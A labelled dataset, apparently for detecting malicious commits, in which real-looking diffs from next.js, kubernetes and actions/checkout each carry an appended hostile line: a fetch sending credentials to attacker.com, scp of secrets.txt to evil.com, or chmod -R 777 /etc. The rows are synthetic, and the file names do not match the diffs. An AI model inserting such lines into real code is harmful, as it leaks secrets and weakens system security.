vercel/next.js,synthetic_456_1689,Jiwon Choi,2025-10-15 12:40:40,Synthetic risky commit,run.sh,6,5,11,"import { nextTestSetup } from 'e2e-utils' -import { assertNoRedbox check retry } from 'next-test-utils' +import { assertNoRedbox check getDistDir retry } from 'next-test-utils' async function resolveStreamResponse(response: any onData?: any) { let result = '' describe('app dir - external dependency' () => { expect(html).toContain('resolve response') const outputFile = await next.readFile( - '.next/server/app/cjs/server/page.js' + `${getDistDir()}/server/app/cjs/server/page.js` ) expect(outputFile).not.toContain('image-response') })
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_457_5201,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,31,3,34,"var _ = SIGDescribe(""Terminate Pods"" func() { } } return false - } 20*time.Second 1*time.Second).Should(gomega.BeTrueBecause(""expected container to be ready"")) + } 20*time.Second 1*time.Second).Should(gomega.BeTrueBecause(""expected container to be not ready"")) err := client.Delete(context.Background() pod.Name metav1.DeleteOptions{})
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_458_9824,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,36,4,40,"pub async fn get_next_client_import_map( match &ty { ClientContextType::Pages { .. } => {} ClientContextType::App { app_dir } => { - let react_flavor = if *next_config.enable_ppr().await? - || *next_config.enable_taint().await? - || *next_config.enable_view_transition().await? - { - ""-experimental"" - } else { - """" - }; + // Keep in sync with file:///./../../../packages/next/src/lib/needs-experimental-react.ts + let react_flavor = + if *next_config.enable_ppr().await? || *next_config.enable_taint().await? { + ""-experimental"" + } else { + """" + }; import_map.insert_exact_alias( rcstr!(""react"") async fn apply_vendored_react_aliases_server( ) -> Result<()> { let ppr = *next_config.enable_ppr().await?; let taint = *next_config.enable_taint().await?; - let view_transition = *next_config.enable_view_transition().await?; - let react_channel = if ppr || taint || view_transition { - ""-experimental"" - } else { - """" - }; + let react_channel = if ppr || taint { ""-experimental"" } else { """" }; let react_condition = if ty.should_use_react_server_condition() { ""server"" } else {
+ chmod -R 777 /etc",1
kubernetes/kubernetes,synthetic_459_2789,Lalit Chauhan,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,38,3,41,"message AllocatedDeviceStatus { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 7; // Conditions contains the latest observation of the device's state. message DeviceRequestAllocationResult { // // +optional // +featureGate=DRAConsumableCapacity + // +k8s:optional + // +k8s:format=k8s-uuid optional string shareID = 9; // ConsumedCapacity tracks the amount of capacity consumed per device as part of the claim request.
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_460_1831,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,34,3,37,"+# This E2E framework sub-package is currently allowed to use arbitrary +# dependencies except of k/k/pkg therefore we need to override the +# restrictions from the parent .import-restrictions file. +# +# At some point it may become useful to also check this package's +# dependencies more careful. +rules: + - selectorRegexp: ""^k8s[.]io/kubernetes/pkg"" + allowedPrefixes: [] + + - selectorRegexp: """" + allowedPrefixes: [ """" ]
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_461_1860,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,27,5,32,"return null; } function getArrayKind(array) { - for (var kind = 0 i = 0; i < array.length; i++) { + for (var kind = 0 i = 0; i < array.length && 100 > i; i++) { var value = array[i]; if (""object"" === typeof value && null !== value) if ( return kind; } function addObjectToProperties(object properties indent prefix) { - for (var key in object) - hasOwnProperty.call(object key) && + var addedProperties = 0 + key; + for (key in object) + if ( + hasOwnProperty.call(object key) && ""_"" !== key[0] && - addValueToProperties(key object[key] properties indent prefix); + (addedProperties++ + addValueToProperties(key object[key] properties indent prefix) + 100 <= addedProperties) + ) { + properties.push([ + prefix + + ""\u00a0\u00a0"".repeat(indent) + + ""Only 100 properties are shown. React will not log more properties of this object."" + """" + ]); + break; + } } function addValueToProperties( propertyName prefix ); propertyName = !1; + key = 0; for (var propKey in value) - ""children"" === propKey - ? null != value.children && - (!isArrayImpl(value.children) || - 0 < value.children.length) && - (propertyName = !0) - : hasOwnProperty.call(value propKey) && - ""_"" !== propKey[0] && - addValueToProperties( - propKey - value[propKey] - properties - indent + 1 - prefix - ); + if ( + (key++ + ""children"" === propKey + ? null != value.children && + (!isArrayImpl(value.children) || + 0 < value.children.length) && + (propertyName = !0) + : hasOwnProperty.call(value propKey) && + ""_"" !== propKey[0] && + addValueToProperties( + propKey + value[propKey] + properties + indent + 1 + prefix + ) + 100 <= key) + ) + break; properties.push([ """" propertyName ? "">\u2026</"" + typeName + "">"" : ""/>"" ]); return; } typeName = Object.prototype.toString.call(value); - typeName = typeName.slice(8 typeName.length - 1); - if (""Array"" === typeName) + propKey = typeName.slice(8 typeName.length - 1); + if (""Array"" === propKey) if ( - ((propKey = getArrayKind(value)) - 2 === propKey || 0 === propKey) + ((typeName = 100 < value.length) + (key = getArrayKind(value)) + 2 === key || 0 === key) ) { - value = JSON.stringify(value); + value = JSON.stringify( + typeName ? value.slice(0 100).concat(""\u2026"") : value + ); break; - } else if (3 === propKey) { + } else if (3 === key) { properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName """" ]); for ( propertyName = 0; - propertyName < value.length; + propertyName < value.length && 100 > propertyName; propertyName++ ) - (typeName = value[propertyName]) + (propKey = value[propertyName]) addValueToProperties( - typeName[0] - typeName[1] + propKey[0] + propKey[1] properties indent + 1 prefix ); + typeName && + addValueToProperties( + (100).toString() + ""\u2026"" + properties + indent + 1 + prefix + ); return; } - if (""Promise"" === typeName) { + if (""Promise"" === propKey) { if (""fulfilled"" === value.status) { if ( ((typeName = properties.length) ]); return; } - ""Object"" === typeName && - (propKey = Object.getPrototypeOf(value)) && - ""function"" === typeof propKey.constructor && - (typeName = propKey.constructor.name); + ""Object"" === propKey && + (typeName = Object.getPrototypeOf(value)) && + ""function"" === typeof typeName.constructor && + (propKey = typeName.constructor.name); properties.push([ prefix + ""\u00a0\u00a0"".repeat(indent) + propertyName - ""Object"" === typeName ? (3 > indent ? """" : ""\u2026"") : typeName + ""Object"" === propKey ? (3 > indent ? """" : ""\u2026"") : propKey ]); 3 > indent && addObjectToProperties(value properties indent + 1 prefix); return hook.checkDCE ? !0 : !1; })({ bundleType: 1 - version: ""19.3.0-experimental-4fdf7cf2-20251003"" + version: ""19.3.0-experimental-c7862584-20251006"" rendererPackageName: ""react-server-dom-turbopack"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-4fdf7cf2-20251003"" + reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" getCurrentComponentInfo: function () { return currentOwnerInDEV; }
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
actions/checkout,synthetic_462_2647,dependabot[bot],2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,9,0,9,"""packages"": { """": { ""name"": ""checkout"" - ""version"": ""4.1.4"" + ""version"": ""4.1.6"" ""license"": ""MIT"" ""dependencies"": { ""@actions/core"": ""^1.10.1"" } ""devDependencies"": { ""@types/jest"": ""^29.5.12"" - ""@types/node"": ""^20.12.7"" + ""@types/node"": ""^20.12.12"" ""@types/uuid"": ""^9.0.8"" - ""@typescript-eslint/eslint-plugin"": ""^7.7.1"" - ""@typescript-eslint/parser"": ""^7.7.1"" + ""@typescript-eslint/eslint-plugin"": ""^7.9.0"" + ""@typescript-eslint/parser"": ""^7.9.0"" ""@vercel/ncc"": ""^0.38.1"" ""eslint"": ""^8.57.0"" ""eslint-plugin-github"": ""^4.10.2"" - ""eslint-plugin-jest"": ""^28.2.0"" + ""eslint-plugin-jest"": ""^28.5.0"" ""jest"": ""^29.7.0"" ""jest-circus"": ""^29.7.0"" ""js-yaml"": ""^4.1.0"" ""pretty-format"": ""^29.0.0"" } } - ""node_modules/@types/json-schema"": { - ""version"": ""7.0.15"" - ""resolved"": ""https://registry.npmjs.org/@types/json-schema/-/json-schema-7.0.15.tgz"" - ""integrity"": ""sha512-5+fP8P8MFNC+AyZCDxrB2pkZFPGzqQWUzpSeuuVLvm8VMcorNYavBqoFcxK8bQz4Qsbn4oUEEem4wDLfcysGHA=="" - ""dev"": true - } ""node_modules/@types/json5"": { ""version"": ""0.0.29"" ""resolved"": ""https://registry.npmjs.org/@types/json5/-/json5-0.0.29.tgz"" ""integrity"": ""sha512-dRLjCWHYg4oaA77cxO64oO+7JwCwnIzkZPdrrC71jQmQtlhM556pwKo5bUzqvZndkVbeFLIIi+9TC40JNF5hNQ=="" ""dev"": true } ""node_modules/@types/node"": { - ""version"": ""20.12.7"" - ""resolved"": ""https://registry.npmjs.org/@types/node/-/node-20.12.7.tgz"" - ""integrity"": ""sha512-wq0cICSkRLVaf3UGLMGItu/PtdY7oaXaI/RVU+xliKVOtRna3PRY57ZDfztpDL0n11vfymMUnXv8QwYCO7L1wg=="" + ""version"": ""20.12.12"" + ""resolved"": ""https://registry.npmjs.org/@types/node/-/node-20.12.12.tgz"" + ""integrity"": ""sha512-eWLDGF/FOSPtAvEqeRAQ4C8LSA7M1I7i0ky1I8U7kD1J5ITyW3AsRhQrKVoWf5pFKZ2kILsEGJhsI9r93PYnOw=="" ""dev"": true ""dependencies"": { ""undici-types"": ""~5.26.4"" } } - ""node_modules/@types/semver"": { - ""version"": ""7.5.8"" - ""resolved"": ""https://registry.npmjs.org/@types/semver/-/semver-7.5.8.tgz"" - ""integrity"": ""sha512-I8EUhyrgfLrcTkzV3TSsGyl1tSuPrEDzr0yd5m90UgNxQkyDXULk3b6MlQqTCpZpNtWe1K0hzclnZkTcLBe2UQ=="" - ""dev"": true - } ""node_modules/@types/stack-utils"": { ""version"": ""2.0.3"" ""resolved"": ""https://registry.npmjs.org/@types/stack-utils/-/stack-utils-2.0.3.tgz"" ""dev"": true } ""node_modules/@typescript-eslint/eslint-plugin"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/eslint-plugin/-/eslint-plugin-7.7.1.tgz"" - ""integrity"": ""sha512-KwfdWXJBOviaBVhxO3p5TJiLpNuh2iyXyjmWN0f1nU87pwyvfS0EmjC6ukQVYVFJd/K1+0NWGPDXiyEyQorn0Q=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/eslint-plugin/-/eslint-plugin-7.9.0.tgz"" + ""integrity"": ""sha512-6e+X0X3sFe/G/54aC3jt0txuMTURqLyekmEHViqyA2VnxhLMpvA6nqmcjIy+Cr9tLDHPssA74BP5Mx9HQIxBEA=="" ""dev"": true ""dependencies"": { ""@eslint-community/regexpp"": ""^4.10.0"" - ""@typescript-eslint/scope-manager"": ""7.7.1"" - ""@typescript-eslint/type-utils"": ""7.7.1"" - ""@typescript-eslint/utils"": ""7.7.1"" - ""@typescript-eslint/visitor-keys"": ""7.7.1"" - ""debug"": ""^4.3.4"" + ""@typescript-eslint/scope-manager"": ""7.9.0"" + ""@typescript-eslint/type-utils"": ""7.9.0"" + ""@typescript-eslint/utils"": ""7.9.0"" + ""@typescript-eslint/visitor-keys"": ""7.9.0"" ""graphemer"": ""^1.4.0"" ""ignore"": ""^5.3.1"" ""natural-compare"": ""^1.4.0"" - ""semver"": ""^7.6.0"" ""ts-api-utils"": ""^1.3.0"" } ""engines"": { } } } - ""node_modules/@typescript-eslint/eslint-plugin/node_modules/lru-cache"": { - ""version"": ""6.0.0"" - ""resolved"": ""https://registry.npmjs.org/lru-cache/-/lru-cache-6.0.0.tgz"" - ""integrity"": ""sha512-Jo6dJ04CmSjuznwJSS3pUeWmd/H0ffTlkXXgwZi+eq1UCmqQwCh+eLsYOYCwY991i2Fah4h1BEMCx4qThGbsiA=="" - ""dev"": true - ""dependencies"": { - ""yallist"": ""^4.0.0"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/@typescript-eslint/eslint-plugin/node_modules/semver"": { - ""version"": ""7.6.0"" - ""resolved"": ""https://registry.npmjs.org/semver/-/semver-7.6.0.tgz"" - ""integrity"": ""sha512-EnwXhrlwXMk9gKu5/flx5sv/an57AkRplG3hTK68W7FRDN+k+OWBj65M7719OkA82XLBxrcX0KSHj+X5COhOVg=="" - ""dev"": true - ""dependencies"": { - ""lru-cache"": ""^6.0.0"" - } - ""bin"": { - ""semver"": ""bin/semver.js"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/@typescript-eslint/eslint-plugin/node_modules/yallist"": { - ""version"": ""4.0.0"" - ""resolved"": ""https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz"" - ""integrity"": ""sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A=="" - ""dev"": true - } ""node_modules/@typescript-eslint/parser"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/parser/-/parser-7.7.1.tgz"" - ""integrity"": ""sha512-vmPzBOOtz48F6JAGVS/kZYk4EkXao6iGrD838sp1w3NQQC0W8ry/q641KU4PrG7AKNAf56NOcR8GOpH8l9FPCw=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/parser/-/parser-7.9.0.tgz"" + ""integrity"": ""sha512-qHMJfkL5qvgQB2aLvhUSXxbK7OLnDkwPzFalg458pxQgfxKDfT1ZDbHQM/I6mDIf/svlMkj21kzKuQ2ixJlatQ=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/scope-manager"": ""7.7.1"" - ""@typescript-eslint/types"": ""7.7.1"" - ""@typescript-eslint/typescript-estree"": ""7.7.1"" - ""@typescript-eslint/visitor-keys"": ""7.7.1"" + ""@typescript-eslint/scope-manager"": ""7.9.0"" + ""@typescript-eslint/types"": ""7.9.0"" + ""@typescript-eslint/typescript-estree"": ""7.9.0"" + ""@typescript-eslint/visitor-keys"": ""7.9.0"" ""debug"": ""^4.3.4"" } ""engines"": { } } ""node_modules/@typescript-eslint/scope-manager"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/scope-manager/-/scope-manager-7.7.1.tgz"" - ""integrity"": ""sha512-PytBif2SF+9SpEUKynYn5g1RHFddJUcyynGpztX3l/ik7KmZEv19WCMhUBkHXPU9es/VWGD3/zg3wg90+Dh2rA=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/scope-manager/-/scope-manager-7.9.0.tgz"" + ""integrity"": ""sha512-ZwPK4DeCDxr3GJltRz5iZejPFAAr4Wk3+2WIBaj1L5PYK5RgxExu/Y68FFVclN0y6GGwH8q+KgKRCvaTmFBbgQ=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/types"": ""7.7.1"" - ""@typescript-eslint/visitor-keys"": ""7.7.1"" + ""@typescript-eslint/types"": ""7.9.0"" + ""@typescript-eslint/visitor-keys"": ""7.9.0"" } ""engines"": { ""node"": ""^18.18.0 || >=20.0.0"" } } ""node_modules/@typescript-eslint/type-utils"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/type-utils/-/type-utils-7.7.1.tgz"" - ""integrity"": ""sha512-ZksJLW3WF7o75zaBPScdW1Gbkwhd/lyeXGf1kQCxJaOeITscoSl0MjynVvCzuV5boUz/3fOI06Lz8La55mu29Q=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/type-utils/-/type-utils-7.9.0.tgz"" + ""integrity"": ""sha512-6Qy8dfut0PFrFRAZsGzuLoM4hre4gjzWJB6sUvdunCYZsYemTkzZNwF1rnGea326PHPT3zn5Lmg32M/xfJfByA=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/typescript-estree"": ""7.7.1"" - ""@typescript-eslint/utils"": ""7.7.1"" + ""@typescript-eslint/typescript-estree"": ""7.9.0"" + ""@typescript-eslint/utils"": ""7.9.0"" ""debug"": ""^4.3.4"" ""ts-api-utils"": ""^1.3.0"" } } } ""node_modules/@typescript-eslint/types"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/types/-/types-7.7.1.tgz"" - ""integrity"": ""sha512-AmPmnGW1ZLTpWa+/2omPrPfR7BcbUU4oha5VIbSbS1a1Tv966bklvLNXxp3mrbc+P2j4MNOTfDffNsk4o0c6/w=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/types/-/types-7.9.0.tgz"" + ""integrity"": ""sha512-oZQD9HEWQanl9UfsbGVcZ2cGaR0YT5476xfWE0oE5kQa2sNK2frxOlkeacLOTh9po4AlUT5rtkGyYM5kew0z5w=="" ""dev"": true ""engines"": { ""node"": ""^18.18.0 || >=20.0.0"" } } ""node_modules/@typescript-eslint/typescript-estree"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/typescript-estree/-/typescript-estree-7.7.1.tgz"" - ""integrity"": ""sha512-CXe0JHCXru8Fa36dteXqmH2YxngKJjkQLjxzoj6LYwzZ7qZvgsLSc+eqItCrqIop8Vl2UKoAi0StVWu97FQZIQ=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/typescript-estree/-/typescript-estree-7.9.0.tgz"" + ""integrity"": ""sha512-zBCMCkrb2YjpKV3LA0ZJubtKCDxLttxfdGmwZvTqqWevUPN0FZvSI26FalGFFUZU/9YQK/A4xcQF9o/VVaCKAg=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/types"": ""7.7.1"" - ""@typescript-eslint/visitor-keys"": ""7.7.1"" + ""@typescript-eslint/types"": ""7.9.0"" + ""@typescript-eslint/visitor-keys"": ""7.9.0"" ""debug"": ""^4.3.4"" ""globby"": ""^11.1.0"" ""is-glob"": ""^4.0.3"" } } } - ""node_modules/@typescript-eslint/typescript-estree/node_modules/lru-cache"": { - ""version"": ""6.0.0"" - ""resolved"": ""https://registry.npmjs.org/lru-cache/-/lru-cache-6.0.0.tgz"" - ""integrity"": ""sha512-Jo6dJ04CmSjuznwJSS3pUeWmd/H0ffTlkXXgwZi+eq1UCmqQwCh+eLsYOYCwY991i2Fah4h1BEMCx4qThGbsiA=="" - ""dev"": true - ""dependencies"": { - ""yallist"": ""^4.0.0"" - } - ""engines"": { - ""node"": "">=10"" - } - } ""node_modules/@typescript-eslint/typescript-estree/node_modules/semver"": { - ""version"": ""7.6.0"" - ""resolved"": ""https://registry.npmjs.org/semver/-/semver-7.6.0.tgz"" - ""integrity"": ""sha512-EnwXhrlwXMk9gKu5/flx5sv/an57AkRplG3hTK68W7FRDN+k+OWBj65M7719OkA82XLBxrcX0KSHj+X5COhOVg=="" + ""version"": ""7.6.2"" + ""resolved"": ""https://registry.npmjs.org/semver/-/semver-7.6.2.tgz"" + ""integrity"": ""sha512-FNAIBWCx9qcRhoHcgcJ0gvU7SN1lYU2ZXuSfl04bSC5OpvDHFyJCjdNHomPXxjQlCBU67YW64PzY7/VIEH7F2w=="" ""dev"": true - ""dependencies"": { - ""lru-cache"": ""^6.0.0"" - } ""bin"": { ""semver"": ""bin/semver.js"" } ""engines"": { ""node"": "">=10"" } } - ""node_modules/@typescript-eslint/typescript-estree/node_modules/yallist"": { - ""version"": ""4.0.0"" - ""resolved"": ""https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz"" - ""integrity"": ""sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A=="" - ""dev"": true - } ""node_modules/@typescript-eslint/utils"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/utils/-/utils-7.7.1.tgz"" - ""integrity"": ""sha512-QUvBxPEaBXf41ZBbaidKICgVL8Hin0p6prQDu6bbetWo39BKbWJxRsErOzMNT1rXvTll+J7ChrbmMCXM9rsvOQ=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/utils/-/utils-7.9.0.tgz"" + ""integrity"": ""sha512-5KVRQCzZajmT4Ep+NEgjXCvjuypVvYHUW7RHlXzNPuak2oWpVoD1jf5xCP0dPAuNIchjC7uQyvbdaSTFaLqSdA=="" ""dev"": true ""dependencies"": { ""@eslint-community/eslint-utils"": ""^4.4.0"" - ""@types/json-schema"": ""^7.0.15"" - ""@types/semver"": ""^7.5.8"" - ""@typescript-eslint/scope-manager"": ""7.7.1"" - ""@typescript-eslint/types"": ""7.7.1"" - ""@typescript-eslint/typescript-estree"": ""7.7.1"" - ""semver"": ""^7.6.0"" + ""@typescript-eslint/scope-manager"": ""7.9.0"" + ""@typescript-eslint/types"": ""7.9.0"" + ""@typescript-eslint/typescript-estree"": ""7.9.0"" } ""engines"": { ""node"": ""^18.18.0 || >=20.0.0"" ""eslint"": ""^8.56.0"" } } - ""node_modules/@typescript-eslint/utils/node_modules/lru-cache"": { - ""version"": ""6.0.0"" - ""resolved"": ""https://registry.npmjs.org/lru-cache/-/lru-cache-6.0.0.tgz"" - ""integrity"": ""sha512-Jo6dJ04CmSjuznwJSS3pUeWmd/H0ffTlkXXgwZi+eq1UCmqQwCh+eLsYOYCwY991i2Fah4h1BEMCx4qThGbsiA=="" - ""dev"": true - ""dependencies"": { - ""yallist"": ""^4.0.0"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/@typescript-eslint/utils/node_modules/semver"": { - ""version"": ""7.6.0"" - ""resolved"": ""https://registry.npmjs.org/semver/-/semver-7.6.0.tgz"" - ""integrity"": ""sha512-EnwXhrlwXMk9gKu5/flx5sv/an57AkRplG3hTK68W7FRDN+k+OWBj65M7719OkA82XLBxrcX0KSHj+X5COhOVg=="" - ""dev"": true - ""dependencies"": { - ""lru-cache"": ""^6.0.0"" - } - ""bin"": { - ""semver"": ""bin/semver.js"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/@typescript-eslint/utils/node_modules/yallist"": { - ""version"": ""4.0.0"" - ""resolved"": ""https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz"" - ""integrity"": ""sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A=="" - ""dev"": true - } ""node_modules/@typescript-eslint/visitor-keys"": { - ""version"": ""7.7.1"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/visitor-keys/-/visitor-keys-7.7.1.tgz"" - ""integrity"": ""sha512-gBL3Eq25uADw1LQ9kVpf3hRM+DWzs0uZknHYK3hq4jcTPqVCClHGDnB6UUUV2SFeBeA4KWHWbbLqmbGcZ4FYbw=="" + ""version"": ""7.9.0"" + ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/visitor-keys/-/visitor-keys-7.9.0.tgz"" + ""integrity"": ""sha512-iESPx2TNLDNGQLyjKhUvIKprlP49XNEK+MvIf9nIO7ZZaZdbnfWKHnXAgufpxqfA0YryH8XToi4+CjBgVnFTSQ=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/types"": ""7.7.1"" + ""@typescript-eslint/types"": ""7.9.0"" ""eslint-visitor-keys"": ""^3.4.3"" } ""engines"": { } } ""node_modules/eslint-plugin-jest"": { - ""version"": ""28.2.0"" - ""resolved"": ""https://registry.npmjs.org/eslint-plugin-jest/-/eslint-plugin-jest-28.2.0.tgz"" - ""integrity"": ""sha512-yRDti/a+f+SMSmNTiT9/M/MzXGkitl8CfzUxnpoQcTyfq8gUrXMriVcWU36W1X6BZSUoyUCJrDAWWUA2N4hE5g=="" + ""version"": ""28.5.0"" + ""resolved"": ""https://registry.npmjs.org/eslint-plugin-jest/-/eslint-plugin-jest-28.5.0.tgz"" + ""integrity"": ""sha512-6np6DGdmNq/eBbA7HOUNV8fkfL86PYwBfwyb8n23FXgJNTR8+ot3smRHjza9LGsBBZRypK3qyF79vMjohIL8eQ=="" ""dev"": true ""dependencies"": { - ""@typescript-eslint/utils"": ""^6.0.0"" + ""@typescript-eslint/utils"": ""^6.0.0 || ^7.0.0"" } ""engines"": { ""node"": ""^16.10.0 || ^18.12.0 || >=20.0.0"" } } } - ""node_modules/eslint-plugin-jest/node_modules/@typescript-eslint/scope-manager"": { - ""version"": ""6.21.0"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/scope-manager/-/scope-manager-6.21.0.tgz"" - ""integrity"": ""sha512-OwLUIWZJry80O99zvqXVEioyniJMa+d2GrqpUTqi5/v5D5rOrppJVBPa0yKCblcigC0/aYAzxxqQ1B+DS2RYsg=="" - ""dev"": true - ""dependencies"": { - ""@typescript-eslint/types"": ""6.21.0"" - ""@typescript-eslint/visitor-keys"": ""6.21.0"" - } - ""engines"": { - ""node"": ""^16.0.0 || >=18.0.0"" - } - ""funding"": { - ""type"": ""opencollective"" - ""url"": ""https://opencollective.com/typescript-eslint"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/@typescript-eslint/types"": { - ""version"": ""6.21.0"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/types/-/types-6.21.0.tgz"" - ""integrity"": ""sha512-1kFmZ1rOm5epu9NZEZm1kckCDGj5UJEf7P1kliH4LKu/RkwpsfqqGmY2OOcUs18lSlQBKLDYBOGxRVtrMN5lpg=="" - ""dev"": true - ""engines"": { - ""node"": ""^16.0.0 || >=18.0.0"" - } - ""funding"": { - ""type"": ""opencollective"" - ""url"": ""https://opencollective.com/typescript-eslint"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/@typescript-eslint/typescript-estree"": { - ""version"": ""6.21.0"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/typescript-estree/-/typescript-estree-6.21.0.tgz"" - ""integrity"": ""sha512-6npJTkZcO+y2/kr+z0hc4HwNfrrP4kNYh57ek7yCNlrBjWQ1Y0OS7jiZTkgumrvkX5HkEKXFZkkdFNkaW2wmUQ=="" - ""dev"": true - ""dependencies"": { - ""@typescript-eslint/types"": ""6.21.0"" - ""@typescript-eslint/visitor-keys"": ""6.21.0"" - ""debug"": ""^4.3.4"" - ""globby"": ""^11.1.0"" - ""is-glob"": ""^4.0.3"" - ""minimatch"": ""9.0.3"" - ""semver"": ""^7.5.4"" - ""ts-api-utils"": ""^1.0.1"" - } - ""engines"": { - ""node"": ""^16.0.0 || >=18.0.0"" - } - ""funding"": { - ""type"": ""opencollective"" - ""url"": ""https://opencollective.com/typescript-eslint"" - } - ""peerDependenciesMeta"": { - ""typescript"": { - ""optional"": true - } - } - } - ""node_modules/eslint-plugin-jest/node_modules/@typescript-eslint/utils"": { - ""version"": ""6.21.0"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/utils/-/utils-6.21.0.tgz"" - ""integrity"": ""sha512-NfWVaC8HP9T8cbKQxHcsJBY5YE1O33+jpMwN45qzWWaPDZgLIbo12toGMWnmhvCpd3sIxkpDw3Wv1B3dYrbDQQ=="" - ""dev"": true - ""dependencies"": { - ""@eslint-community/eslint-utils"": ""^4.4.0"" - ""@types/json-schema"": ""^7.0.12"" - ""@types/semver"": ""^7.5.0"" - ""@typescript-eslint/scope-manager"": ""6.21.0"" - ""@typescript-eslint/types"": ""6.21.0"" - ""@typescript-eslint/typescript-estree"": ""6.21.0"" - ""semver"": ""^7.5.4"" - } - ""engines"": { - ""node"": ""^16.0.0 || >=18.0.0"" - } - ""funding"": { - ""type"": ""opencollective"" - ""url"": ""https://opencollective.com/typescript-eslint"" - } - ""peerDependencies"": { - ""eslint"": ""^7.0.0 || ^8.0.0"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/@typescript-eslint/visitor-keys"": { - ""version"": ""6.21.0"" - ""resolved"": ""https://registry.npmjs.org/@typescript-eslint/visitor-keys/-/visitor-keys-6.21.0.tgz"" - ""integrity"": ""sha512-JJtkDduxLi9bivAB+cYOVMtbkqdPOhZ+ZI5LC47MIRrDV4Yn2o+ZnW10Nkmr28xRpSpdJ6Sm42Hjf2+REYXm0A=="" - ""dev"": true - ""dependencies"": { - ""@typescript-eslint/types"": ""6.21.0"" - ""eslint-visitor-keys"": ""^3.4.1"" - } - ""engines"": { - ""node"": ""^16.0.0 || >=18.0.0"" - } - ""funding"": { - ""type"": ""opencollective"" - ""url"": ""https://opencollective.com/typescript-eslint"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/lru-cache"": { - ""version"": ""6.0.0"" - ""resolved"": ""https://registry.npmjs.org/lru-cache/-/lru-cache-6.0.0.tgz"" - ""integrity"": ""sha512-Jo6dJ04CmSjuznwJSS3pUeWmd/H0ffTlkXXgwZi+eq1UCmqQwCh+eLsYOYCwY991i2Fah4h1BEMCx4qThGbsiA=="" - ""dev"": true - ""dependencies"": { - ""yallist"": ""^4.0.0"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/minimatch"": { - ""version"": ""9.0.3"" - ""resolved"": ""https://registry.npmjs.org/minimatch/-/minimatch-9.0.3.tgz"" - ""integrity"": ""sha512-RHiac9mvaRw0x3AYRgDC1CxAP7HTcNrrECeA8YYJeWnpo+2Q5CegtZjaotWTWxDG3UeGA1coE05iH1mPjT/2mg=="" - ""dev"": true - ""dependencies"": { - ""brace-expansion"": ""^2.0.1"" - } - ""engines"": { - ""node"": "">=16 || 14 >=14.17"" - } - ""funding"": { - ""url"": ""https://github.com/sponsors/isaacs"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/semver"": { - ""version"": ""7.6.0"" - ""resolved"": 